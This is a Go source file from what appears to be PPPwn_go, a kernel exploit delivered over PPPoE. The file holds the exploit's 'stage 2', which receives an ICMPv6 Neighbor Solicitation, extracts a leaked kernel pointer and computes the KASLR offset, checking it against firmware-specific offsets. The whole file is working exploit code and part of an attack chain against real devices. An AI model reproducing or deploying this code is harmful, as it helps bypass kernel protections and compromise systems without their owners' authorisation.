package exploit

import (
	"encoding/binary"

	"github.com/google/gopacket/layers"

	"github.com/wetor/PPPwn_go/internal/errors"
	"github.com/wetor/PPPwn_go/internal/logger"
)

func (e *Exploit) runStage2() (err error) {
	var data []byte
	logger.Infof("[*] Defeating KASLR...")
	end := false
	_, ns, err := e.p.ReceiveICMPv6NS(e.ctx, true)
	if err != nil {
		return err
	}

	for _, opt := range ns.Options {
		if opt.Type == layers.ICMPv6OptSourceAddress && len(opt.Data) > 1 {
			if len(opt.Data) >= 9 {
				data = opt.Data
				end = true
			}
			break
		}
	}
	if !end {
		logger.Infof("[-] Error leak is invalid. Wrong ICMPv6NeighborSolicitation")
		return errors.KASLRLeakInvalidError
	}

	e.pppoeSoftcList = binary.LittleEndian.Uint64(data[1:9])
	logger.Infof("[+] pppoe_softc_list: %x", e.pppoeSoftcList)
	e.kaslrOffset = e.pppoeSoftcList - e.offs.PPPOE_SOFTC_LIST
	logger.Infof("[+] kaslr_offset: %x", e.kaslrOffset)

	if e.pppoeSoftcList&0xffffffff00000fff != e.offs.PPPOE_SOFTC_LIST&0xffffffff00000fff {
		logger.Infof("[-] Error leak is invalid. Wrong firmware?")
		return errors.KASLRLeakInvalidError
	}
	return nil
}
